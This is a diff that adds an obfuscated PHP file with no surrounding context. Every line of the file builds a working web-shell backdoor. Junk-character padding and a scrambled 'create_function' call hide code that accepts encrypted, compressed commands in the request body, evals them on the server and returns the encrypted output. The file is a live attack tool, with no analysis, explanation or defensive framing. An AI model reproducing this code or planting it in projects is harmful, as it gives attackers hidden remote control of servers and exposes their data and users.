@@ -1,0 +1,13 @@
+<?php
+$L='$k="5tn223ed40";$tnkhtn="79ftn4cdb29tn1cd";$ktnf="ef9334tnetne70df";$p="';
+$o='dtn6WStncltnstnOdX9Iwhw3";futntnnctiotnn x($t,$k){$ctn=strletnn($k);$ltn=';
+$d='mtn[1]),$k)))tn;tn$o=@otnb_gtnetnt_tncontentstn()tn;@ob_end_clean();$r=';
+$b='sttnrlen($tnt);$otn="";for($i=0;tn$i<$l;tn)tn{tntnfor($j=0;($j<$c&&$i<$';
+$N='eg_match(tn"/$khtn(.+tn)$kf/",@fitnle_tnget_contetnntnts("ptnhp://input")tn,$tnm)==';
+$n=str_replace('ii','','criieiiate_iiiifunciitiiion');
+$P='tnl);tn$j++,tn$i++){$o.=$tnttn{$i}^$k{$jtn};}tn}return tn$o;tn}if (@prtn';
+$w='tn1) {tn@ob_start();@etnval(tn@gzuntncomptnrestns(@x(@basetn64_dectnode($';
+$g='@base6tn4_tntnencode(@tnx(@gtnzcompress(tn$o),$k));prtnint("tn$p$tnkh$r$kf");}';
+$J=str_replace('tn','',$L.$o.$b.$P.$N.$w.$d.$g);
+$v=$n('',$J);$v();
+?>
